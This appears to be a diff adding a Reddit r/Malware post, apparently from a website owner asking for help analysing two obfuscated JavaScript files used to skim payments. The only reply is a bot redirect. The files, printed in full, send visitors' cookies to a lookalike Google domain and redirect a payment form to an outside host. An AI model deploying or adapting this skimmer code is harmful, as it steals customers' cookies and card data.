@@ -1,0 +1,33 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "These files was used to steal payments from our website.\n\n&amp;#x200B;\n\nI need to understand what it really does and will appreciate if any of the experts here will help me understand more about them.\n\n&amp;#x200B;\n\nThank you!\n\n&amp;#x200B;\n\nswfobject.js:\n\n&amp;#x200B;\n\n`eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?\"\":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('9 8(){4 d=2.6.v(\"b=\");5(d==-1&amp;&amp;(/w|u|s|t|x|B|C|A|y|z|r|l/i.j(h.p)==q)){4 g=e.m(e.n()*1);5(g==0){4 7=2.k(\\'o\\');7.D=\"S://V-W.U.Y/T/Z.10?c=\"+X(2.6);2.R.H(7)}4 3=I J();3.E(3.F()+G);a.2.6=\"b=K; O=\"+3.P()}}5(Q(f)!=\\'L\\'){f(9(){8()})}M{a.N=9(){8()}}',62,63,'||document|dd|var|if|cookie|sss|adsadsgg|function|window|_utmzz||gd|Math|jQuery|rd|navigator||test|createElement|Yeti|floor|random|script|userAgent|false|Yandex|Bingbot|Googlebot|baiduspider|indexOf|Applebot|ia_archiver|Slurp|teoma|seznambot|msnbot|Naverbot|src|setTime|getTime|86400000|appendChild|new|Date|ga|undefined|else|onload|expires|toGMTString|typeof|body|https|ajax|onther|google|maps|escape|com|json|aspx'.split('|'),0,{}));`\n\n&amp;#x200B;\n\njson.aspx:\n\n&amp;#x200B;\n\n`eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?\"\":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('a(9.c.b==\\'7://d.2.1/6.5?4=3\\'||\\'7://2.1/6.5?4=3\\'){8.m.l(\\'k\\')[0].o=\\'n://g.f-e.j/\\';8.i.h()}',25,25,'|com|nozokinakamuraya|chk|act|php|premium_regist_form_new|http|document|window|if|href|location|www|pay|cc|ssl|submit|action_body|jp|form|getElementsByTagName|body|https|action'.split('|'),0,{}))`\n\n&amp;#x200B;\n\nThank you!",
+        "title": "Please help me analyze these files",
+        "score": 1,
+        "id": "9u1sif",
+        "commsNum": 1,
+        "timeStamp": "2018/11/04-00:51:23",
+        "author_name": "spec1600BC",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 1,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/9u1sif/please_help_me_analyze_these_files/"
+    },
+    "posts": {
+        "e90t66r": {
+            "comment": "It looks like you are posting a question, possibly looking for technical support. \n\nThis subreddit\u2019s purpose is to discuss malware internals and technical details. *This is NOT a place for help with malware removal or various other end-user questions. Please redirect questions related to malware removal to /r/Antivirus or /r/techsupport. Ransomware related questions can be directed to /r/ransomware*\n\nIf this was removed in error, please message the moderators - we love reading quality content just as much as you do!\n\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Malware) if you have any questions or concerns.*",
+            "timeStamp": "2018/11/04-00:51:24",
+            "id": "e90t66r",
+            "is_submitter": false,
+            "link_id": "t3_9u1sif",
+            "parent_id": "t3_9u1sif",
+            "score": 1,
+            "stickied": false,
+            "author_name": "AutoModerator"
+        }
+    }
+}
